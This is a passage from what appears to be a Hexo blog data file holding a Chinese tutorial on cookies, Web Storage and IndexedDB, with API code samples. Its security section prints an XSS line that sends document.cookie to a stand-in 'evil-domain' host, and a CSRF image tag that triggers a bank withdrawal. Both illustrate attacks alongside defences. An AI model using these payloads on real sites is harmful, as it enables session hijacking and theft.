事件，了解是否写入成功。\n\n#### 3.4.读取数据\n\n读取数据也是通过事务完成。\n\n```\nfunction read() {\n   var transaction = db.transaction(['person']);\n   var objectStore = transaction.objectStore('person');\n   var request = objectStore.get(1);\n\n   request.onerror = function(event) {\n     console.log('事务失败');\n   };\n\n   request.onsuccess = function( event) {\n      if (request.result) {\n        console.log('Name: ' + request.result.name);\n        console.log('Age: ' + request.result.age);\n        console.log('Email: ' + request.result.email);\n      } else {\n        console.log('未获得数据记录');\n      }\n   };\n}\n\nread();\n```\n\n上面代码中，**objectStore.get()**方法用于读取数据，参数是主键的值。\n\n#### 3.5.遍历数据\n\n遍历数据表格的所有记录，要使用指针对象 IDBCursor。\n\n```\nfunction readAll() {\n  var objectStore = db.transaction('person').objectStore('person');\n\n   objectStore.openCursor().onsuccess = function (event) {\n     var cursor = event.target.result;\n\n     if (cursor) {\n       console.log('Id: ' + cursor.key);\n       console.log('Name: ' + cursor.value.name);\n       console.log('Age: ' + cursor.value.age);\n       console.log('Email: ' + cursor.value.email);\n       cursor.continue();\n    } else {\n      console.log('没有更多数据了！');\n    }\n  };\n}\n\nreadAll();\n```\n\n上面代码中，新建指针对象的**openCursor()方法**是一个异步操作，所以要监听 success 事件。\n\n#### 3.6.更新数据\n\n更新数据要使用**IDBObject.put()方法**。\n\n```\nfunction update() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .put({ id: 1, name: '李四', age: 35, email: 'lisi@example.com' });\n\n  request.onsuccess = function (event) {\n    console.log('数据更新成功');\n  };\n\n  request.onerror = function (event) {\n    console.log('数据更新失败');\n  }\n}\n\nupdate();\n```\n\n上面代码中，put()方法自动更新了主键为 1 的记录。\n\n#### 3.7.删除数据\n\n**IDBObjectStore.delete()方法**用于删除记录。\n\n```\nfunction remove() {\n  var request = db.transaction(['person'], 'readwrite')\n    .objectStore('person')\n    .delete(1);\n\n  request.onsuccess = function (event) {\n    console.log('数据删除成功');\n  };\n}\n\nremove();\n```\n\n#### 3.8.使用索引\n\n索引的意义在于，可以让你搜索任意字段，也就是说从任意字段拿到数据记录。如果不建立索引，默认只能搜索主键（即从主键取值）。\n\n假定新建表格的时候，对 name 字段建立了索引。\n\n```\nobjectStore.createIndex('name', 'name', { unique: false });\n```\n\n现在，就可以从 name 找到对应的数据记录了。\n\n```\nvar transaction = db.transaction(['person'], 'readonly');\nvar store = transaction.objectStore('person');\nvar index = store.index('name');\nvar request = index.get('李四');\n\nrequest.onsuccess = function (e) {\n  var result = e.target.result;\n  if (result) {\n    // ...\n  } else {\n    // ...\n  }\n}\n```\n\n### 关闭 IndexDB\n\n**indexdb.close()**\n\n## 3.WebStorage、cookie 和 IndexedDB 之间的区别\n\n| 特性         | cookie                                       | localstorage             | sessionstorage | indexDB                  |\n| ------------ | :------------------------------------------- | :----------------------- | :------------- | :----------------------- |\n| 数据生命周期 | 一般有服务器生成，可以设置过期时间           | 除非被清除，否则一直存在 | 页面关闭就清理 | 除非被清除，否则一直存在 |\n| 数据存储大小 | 4K                                           | 5M                       | 5M             | 无限                     |\n| 与服务端通信 | 每次都会携带在 header 里，对于性能有很大影响 | 不参与                   | 不参与         | 不参与                   |\n\n从上表可以看到，cookie 已经不建议用于存储。如果没有大量数据存储需求的话，可以使用 localStorage 和 sessionStorage 。对于不怎么改变的数据尽量使用 localStorage 存储，否则可以用 sessionStorage 存储。\n\n# 小结\n\n正是浏览器存储、缓存技术的出现和发展，为我们的前端应用带来了无限的转机。近年来基于存储、缓存技术的第三方库层出不绝，此外还衍生出了 PWA 这样优秀的 Web 应用模型。总结下本文几个核心观点：\n\n- Cookie 的本职工作并非本地存储，而是“维持状态”\n- Web Storage 是 HTML5 专门为浏览器存储而提供的数据存储机制，不与服务端发生通信\n- IndexedDB 用于客户端存储大量结构化数据\n","slug":"关于浏览器存储","published":1,"updated":"2022-02-23T03:09:02.879Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckzz950cx000dn0w197633nxa","content":"<h1 id=\"浏览器存储有哪些？\"><a href=\"#浏览器存储有哪些？\" class=\"headerlink\" title=\"浏览器存储有哪些？\"></a>浏览器存储有哪些？</h1><ul>\n<li>Cookie</li>\n<li>LocalStorage</li>\n<li>SessionStorage</li>\n<li>IndexDB</li>\n</ul>\n<h1 id=\"Cookie\"><a href=\"#Cookie\" class=\"headerlink\" title=\"Cookie\"></a>Cookie</h1><h3 id=\"1-Cookie-的来源\"><a href=\"#1-Cookie-的来源\" class=\"headerlink\" title=\"1.Cookie 的来源\"></a>1.Cookie 的来源</h3><p><strong>Cookie 的本职工作并非本地存储，而是“维持状态”。</strong><br>因为 <strong>HTTP 协议是无状态的，HTTP 协议自身不对请求和响应之间的通信状态进行保存</strong>，通俗来说，服务器不知道用户上一次做了什么，这严重阻碍了交互式 Web 应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于 HTTP 的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，于是就诞生了 Cookie。它就是用来绕开 HTTP 的无状态性的“额外手段”之一。服务器可以设置或读取 Cookies 中包含信息，借此维护用户跟服务器会话中的状态。</p>\n<p>我们可以把 Cookie 理解为一个存储在浏览器里的一个小小的文本文件，它附着在 HTTP 请求上，在浏览器和服务器之间“飞来飞去”。它可以携带用户信息，当服务器检查 Cookie 的时候，便可以获取到客户端的状态。</p>\n<p>在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段 Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把 Cookie 发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段 Cookie 里追加新的商品信息。结帐时，服务器读取发送来的 Cookie 就行了。</p>\n<h3 id=\"2-什么是-Cookie-以及应用场景\"><a href=\"#2-什么是-Cookie-以及应用场景\" class=\"headerlink\" title=\"2.什么是 Cookie 以及应用场景\"></a>2.什么是 Cookie 以及应用场景</h3><p>HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie 使基于无状态的 HTTP 协议记录稳定的状态信息成为了可能。<br>Cookie 是一个请求首部，其中含有先前由服务器通过 Set-Cookie 首部投放并存储到客户端的 HTTP cookies。<br><strong>Cookie 指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie 是服务端生成，客户端进行维护和存储</strong>。通过 cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时 response header 中的 set-cookie,Web 服务器接到请求时也能读出 cookie 的值，根据 cookie 值的内容就可以判断和恢复一些用户的信息状态。</p>\n  <!-- 典型的应用场景有：\n\n  - 记住密码，下次自动登录。\n  - 购物车功能。\n  - 记录用户浏览数据，进行商品（广告）推荐。 -->\n\n<p>Cookie 主要用于以下三个方面：</p>\n<ul>\n<li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li>\n<li>个性化设置（如用户自定义设置、主题等）</li>\n<li>浏览器行为跟踪（如跟踪分析用户行为等）</li>\n</ul>\n<h3 id=\"3-Cookie-的原理以及如何生成\"><a href=\"#3-Cookie-的原理以及如何生成\" class=\"headerlink\" title=\"3.Cookie 的原理以及如何生成\"></a>3.Cookie 的原理以及如何生成</h3><p>第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个 Set-Cookie 选项，将 cookie 放入到响应请求中，在浏览器第二次发请求的时候，会通过 Cookie 请求头部将 Cookie 信息发送给服务器，服务端会辨别用户身份，另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。</p>\n<p>Cookie 的生成方式主要有两种：</p>\n<ul>\n<li>生成方式一：http response header 中的 set-cookie</li>\n</ul>\n<p>我们可以通过响应头里的 Set-Cookie 指定要存储的 Cookie 值。默认情况下，domain 被设置为设置 Cookie 页面的主机名，我们也可以手动设置 domain 的值。<br>服务器通过该头部告知客户端保存 Cookie 信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.0 200 OK</span><br><span class=\"line\">Content-type: text/html</span><br><span class=\"line\">Set-Cookie: yummy_cookie=choco</span><br><span class=\"line\">Set-Cookie: tasty_cookie=strawberry</span><br><span class=\"line\">[页面内容]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的 Cookie 信息通过 Cookie 请求头部再发送给服务器。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /sample_page.html HTTP/1.1</span><br><span class=\"line\">Host: www.example.org</span><br><span class=\"line\">Cookie: yummy_cookie=choco; tasty_cookie=strawberry</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"会话期-Cookie\"><a href=\"#会话期-Cookie\" class=\"headerlink\" title=\"会话期 Cookie\"></a>会话期 Cookie</h5><p>会话期 Cookie 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期 Cookie 不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期 Cookie 也会被保留下来，就好像浏览器从来没有关闭一样。</p>\n<h5 id=\"持久性-Cookie\"><a href=\"#持久性-Cookie\" class=\"headerlink\" title=\"持久性 Cookie\"></a>持久性 Cookie</h5><p>和关闭浏览器便失效的会话期 Cookie 不同，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</span><br></pre></td></tr></table></figure>\n\n<p><strong>Tips:</strong> 当 Cookie 的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。</p>\n<h4 id=\"Cookie-的-Secure-和-HttpOnly-标记\"><a href=\"#Cookie-的-Secure-和-HttpOnly-标记\" class=\"headerlink\" title=\"Cookie 的 Secure 和 HttpOnly 标记\"></a>Cookie 的 Secure 和 HttpOnly 标记</h4><p>HttpOnly 不支持读写，浏览器不允许脚本操作 document.cookie 去更改 cookie， 所以为避免跨域脚本 (XSS) 攻击，通过 JavaScript 的 Document.cookie API 无法访问带有 HttpOnly 标记的 Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span><br></pre></td></tr></table></figure>\n\n<p>标记为 Secure 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，Secure 标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用 Cookie 的 Secure 标记。</p>\n<ul>\n<li>生成方式二：js 中可以通过 document.cookie 可以读写 cookie，以键值对的形式展示</li>\n</ul>\n<p>例如我们在百度首页控制台输入以下三句代码，便可以在 Chrome 的 Application 面板查看生成的 cookie:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">document.cookie=&quot;name=hello&quot;;</span><br><span class=\"line\">document.cookie=&quot;age=18&quot;;</span><br><span class=\"line\">document.cookie=&quot;domain=google.com;gender=male&quot;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/code.png\" alt=\"code\"><br>查看结果<br><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/cookie.png\" alt=\"cookie\"></p>\n<p>从上图中我们可以得出：</p>\n<h5 id=\"Cookie-的作用域\"><a href=\"#Cookie-的作用域\" class=\"headerlink\" title=\"Cookie 的作用域\"></a>Cookie 的作用域</h5><p>Domain 和 Path 标识定义了 Cookie 的作用域：即 Cookie 应该发送给哪些 URL。<br>Domain 标识指定了哪些主机可以接受 Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了 Domain，则一般包含子域名。</p>\n<p><strong>Domain 标识指定了哪些域名可以接受 Cookie。如果没有设置 domain，就会自动绑定到执行语句的当前域</strong>。 如果设置为”.google.com”,则所有以”google.com”结尾的域名都可以访问该 Cookie，所以在百度首页上读取不到第三条代码存储 Cookie 值。</p>\n<p>当将域名设置为当前执行语句的域名时，就可以看见该条记录<br><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/code.png\" alt=\"code1\"><br>查看结果<br><img src=\"%E5%85%B3%E4%BA%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AD%98%E5%82%A8/cookie.png\" alt=\"cookie1\"></p>\n<h3 id=\"4-Cookie-的缺陷\"><a href=\"#4-Cookie-的缺陷\" class=\"headerlink\" title=\"4.Cookie 的缺陷\"></a>4.Cookie 的缺陷</h3><ul>\n<li><p>Cookie 不够大<br>Cookie 的大小限制在 4KB 左右，对于复杂的存储需求来说是不够用的。当 Cookie 超过 4KB 时，它将面临被裁切的命运。这样看来，Cookie 只能用来存取少量的信息。此外很多浏览器对一个站点的 cookie 个数也是有限制的。<br>这里需注意：各浏览器的 cookie <strong>每一个 name=value 的 value 值大概在 4k</strong>，所以 4k 并不是一个域名下所有的 cookie 共享的,而是一个 name 的大小。</p>\n</li>\n<li><p>过多的 Cookie 会带来巨大的性能浪费<br>Cookie 是紧跟域名的。<strong>同一个域名下的所有请求，都会携带 Cookie</strong>。大家试想，如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的。<br>cookie 是用来维护用户信息的，而域名(domain)下所有请求都会携带 cookie，但对于静态文件的请求，携带 cookie 信息根本没有用，此时可以通过 cdn（存储静态文件的）的域名和主站的域名分开来解决。</p>\n</li>\n<li><p>安全问题<br>由于在 HTTP 请求中的 Cookie 是明文传递的，所以安全性成问题，除非用 HTTPS。</p>\n</li>\n</ul>\n<h3 id=\"5-Cookie-与安全\"><a href=\"#5-Cookie-与安全\" class=\"headerlink\" title=\"5.Cookie 与安全\"></a>5.Cookie 与安全</h3><p><strong>tips:</strong> 当机器处于不安全环境时，切记不能通过 HTTP Cookie 存储、传输敏感信息</p>\n<ul>\n<li>会话劫持和跨站脚本攻击（XSS）<br>在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 XSS 攻击。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>跨站请求伪造（CSRF）<br>比如在不安全聊天室或论坛上的一张图片，当你访问这张图片，它实际上是一个给你银行服务器发送提现的请求：<br>当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&quot;http://bank.example.com/withdraw?account=bob&amp;amount=1000000&amp;for=mallory&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p>有一些方法可以阻止此类事件的发生：</p>\n<ul>\n<li>对用户输入进行过滤来阻止 XSS；</li>\n<li>任何敏感操作都需要确认；</li>\n<li>用于敏感信息的 Cookie 只能拥有较短的生命周期；</li>\n</ul>\n<p>为了弥补 Cookie 的局限性，让“专业的人做专业的事情”，Web Storage 出现了。<br><strong>HTML5 中新增了本地存储的解决方案—-Web Storage，它分成两类：sessionStorage 和 localStorage。</strong>这样有了 WebStorage 后，cookie 能只做它应该做的事情了——作为客户端与服务器交互的通道，保持客户端状态。</p>\n<h1 id=\"LocalStorage\"><a href=\"#LocalStorage\" class=\"headerlink\" title=\"LocalStorage\"></a>LocalStorage</h1><h2 id=\"1-LocalStorage-的特点\"><a href=\"#1-LocalStorage-的特点\" class=\"headerlink\" title=\"1.LocalStorage 的特点\"></a>1.LocalStorage 的特点</h2><ul>\n<li>保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。</li>\n<li>大小为 5M 左右</li>\n<li>仅在客户端使用，不和服务端进行通信</li>\n<li>接口封装较好</li>\n</ul>\n<h2 id=\"2-存入-读取-删除数据\"><a href=\"#2-存入-读取-删除数据\" class=\"headerlink\" title=\"2.存入/读取/删除数据\"></a>2.存入/读取/删除数据</h2><p>localStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 localStorage.setItem(“key”,”value”);读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=localStorage.getItem(“key”);</p>\n<ul>\n<li>存入数据<br><strong>localStorage.setItem(“key”, “value”)</strong><br>该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">if (window.localStorage) &#123;</span><br><span class=\"line\">  localStorage.setItem(&quot;name&quot;, &quot;hello&quot;);</span><br><span class=\"line\">  localStorage.setItem(&quot;age&quot;, 18);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>读取数据<br><strong>localStorage.getItem(“key”)</strong><br>该方法接受一个键名作为参数，返回键名对应的值<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var name = localStorage.getItem(&quot;name&quot;);</span><br><span class=\"line\">var age = localStorage.getItem(&quot;age&quot;);</span><br><span class=\"line\">console.log(name) // hello</span><br><span class=\"line\">console.log(age) // 18</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除数据<br><strong>localStorage.removeItem(“key”);</strong><br>该方法接受一个键名作为参数，并把该键名从存储中删除。<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">localStorage.removeItem(&quot;name&quot;);</span><br><span class=\"line\">localStorage.removeItem(&quot;age&quot;);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>移除所有<br><strong>localStorage.clear();</strong><br>调用该方法会清空存储中的所有键名。<br>不需要传入参数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">localStorage.clear();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-使用场景\"><a href=\"#3-使用场景\" class=\"headerlink\" title=\"3.使用场景\"></a>3.使用场景</h2><p>LocalStorage 在存储方面没有什么特别的限制，理论上 Cookie 无法胜任的、可以用简单的键值对来存取的数据存储任务，都可以交给 LocalStorage 来做。</p>\n<p>这里给大家举个例子，考虑到 LocalStorage 的特点之一是持久，有时我们更倾向于用它来存储一些内容稳定的资源。比如图片内容丰富的电商网站会用它来存储 Base64 格式的图片字符串：</p>\n<h1 id=\"SessionStorage\"><a href=\"#SessionStorage\" class=\"headerlink\" title=\"SessionStorage\"></a>SessionStorage</h1><p>sessionStorage 保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；sessionStorage 特别的一点在于，即便是相同域名下的两个页面，只要它们不在同一个浏览器窗口中打开，那么它们的 sessionStorage 内容便无法共享；localStorage 在所有同源窗口中都是共享的；cookie 也是在所有同源窗口中都是共享的。除了保存期限的长短不同，SessionStorage 的属性和方法与 LocalStorage 完全一样。</p>\n<h2 id=\"1-sessionStorage-的特点\"><a href=\"#1-sessionStorage-的特点\" class=\"headerlink\" title=\"1.sessionStorage 的特点\"></a>1.sessionStorage 的特点</h2><ul>\n<li>会话级别的浏览器存储</li>\n<li>大小为 5M 左右</li>\n<li>仅在客户端使用，不和服务端进行通信</li>\n<li>接口封装较好</li>\n</ul>\n<h2 id=\"2-存入-读取-删除数据-1\"><a href=\"#2-存入-读取-删除数据-1\" class=\"headerlink\" title=\"2.存入/读取/删除数据\"></a>2.存入/读取/删除数据</h2><p>sessionStorage 保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用 setItem 方法。它接受两个参数，第一个是键名，第二个是保存的数据。 sessionStorage.setItem(“key”,”value”);读取数据使用 getItem 方法。它只有一个参数，就是键名。 var valueLocal=sessionStorage.getItem(“key”);</p>\n<ul>\n<li>存入数据<br><strong>sessionStorage.setItem(“key”, “value”)</strong><br>该方法接受一个键名和值作为参数，将会把键值对添加到存储中，如果键名存在，则更新其对应的值。</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">if (window.sessionStorage) &#123;</span><br><span class=\"line\">  sessionStorage.setItem(&quot;name&quot;, &quot;hello&quot;);</span><br><span class=\"line\">  sessionStorage.setItem(&quot;age&quot;, 18);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>读取数据<br><strong>sessionStorage.getItem(“key”)</strong><br>该方法接受一个键名作为参数，返回键名对应的值<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var name = sessionStorage.getItem(&quot;name&quot;);</span><br><span class=\"line\">var age = sessionStorage.getItem(&quot;age&quot;);</span><br><span class=\"line\">console.log(name) // hello</span><br><span class=\"line\">console.log(age) // 18</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>删除数据<br><strong>sessionStorage.removeItem(“key”);</strong><br>该方法接受一个键名作为参数，并把该键名从存储中删除。<br>只需要传入 key 即可</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sessionStorage.removeItem(&quot;name&quot;);</span><br><span class=\"line\">sessionStorage.removeItem(&quot;age&quot;);</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>移除所有<br><strong>sessionStorage.clear();</strong><br>调用该方法会清空存储中的所有键名。<br>不需要传入参数</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sessionStorage.clear();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-使用场景-1\"><a href=\"#3-使用场景-1\" class=\"headerlink\" title=\"3.使用场景\"></a>3.使用场景</h2><p>sessionStorage 更适合用来存储生命周期和它同步的会话级别的信息。这些信息只适用于当前会话，当你开启新的会话时，它也需要相应的更新或释放。比如微博的 sessionStorage 就主要是存储你本次会话的浏览足迹</p>\n<h2 id=\"sessionStorage-、localStorage-和-cookie-之间的区别\"><a href=\"#sessionStorage-、localStorage-和-cookie-之间的区别\" class=\"headerlink\" title=\"sessionStorage 、localStorage 和 cookie 之间的区别\"></a><strong>sessionStorage 、localStorage 和 cookie 之间的区别</strong></h2><ul>\n<li>共同点：都是保存在浏览器端，且都遵循同源策略。</li>\n<li>不同点：在于生命周期与作用域的不同</li>\n</ul>\n<p>作用域：localStorage 只要在相同的协议、相同的主机名、相同的端口下，就能读取/修改到同一份 localStorage 数据。sessionStorage 比 localStorage 更严苛一点，除了协议、主机名、端口外，还要求在同一窗口（也就是浏览器的标签页）下</p>\n<p>生命周期：localStorage 是持久化的本地存储，存储在其中的数据是永远不会过期的，使其消失的唯一办法是手动删除；而 sessionStorage 是临时性的本地存储，它是会话级别的存储，当会话结束（页面被关闭）时，存储内容也随之被释放。</p>\n<p>Web Storage 是一个从定义到使用都非常简单的东西。它使用键值对的形式进行存储，这种模式有点类似于对象，却甚至连对象都不是——它只能存储字符串，要想得到对象，我们还需要先对字符串进行一轮解析。</p>\n<p>说到底，Web Storage 是对 Cookie 的拓展，它只能用于存储少量的简单数据。当遇到大规模的、结构复杂的数据时，Web Storage 也爱莫能助了。这时候我们就要清楚我们的终极大 boss——IndexedDB！</p>\n<h1 id=\"IndexDB\"><a href=\"#IndexDB\" class=\"headerlink\" title=\"IndexDB\"></a>IndexDB</h1><p>通俗地说，IndexedDB 就是<strong>浏览器提供的本地数据库</strong>，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。<br>IndexedDB 是一种低级 API，**用于客户端存储大量结构化数据(包括文件和 blobs)**。该 API 使用索引来实现对该数据的高性能搜索。IndexedDB 是一个运行在浏览器上的非关系型数据库。既然是数据库了，那就不是 5M、10M 这样小打小闹级别了。理论上来说，IndexedDB 是没有存储上限的（一般来说不会小于 250M）。它不仅可以存储字符串，还可以存储二进制数据。</p>\n<h2 id=\"1-IndexedDB-的特点\"><a href=\"#1-IndexedDB-的特点\" class=\"headerlink\" title=\"1.IndexedDB 的特点\"></a>1.IndexedDB 的特点</h2><ul>\n<li><p>键值对储存。<br>IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以”键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</p>\n</li>\n<li><p>异步<br>IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。</p>\n</li>\n<li><p>支持事务。<br>IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。</p>\n</li>\n<li><p>同源限制<br>IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。</p>\n</li>\n<li><p>储存空间大<br>IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。</p>\n</li>\n<li><p>支持二进制储存。<br>IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。</p>\n</li>\n</ul>\n<h2 id=\"2-基本概念\"><a href=\"#2-基本概念\" class=\"headerlink\" title=\"2.基本概念\"></a>2.基本概念</h2><p>IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。</p>\n<ul>\n<li><p>数据库：IDBDatabase 对象<br>数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。<br>IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。</p>\n</li>\n<li><p>对象仓库：IDBObjectStore 对象<br>每个数据库包含若干个对象仓库（object 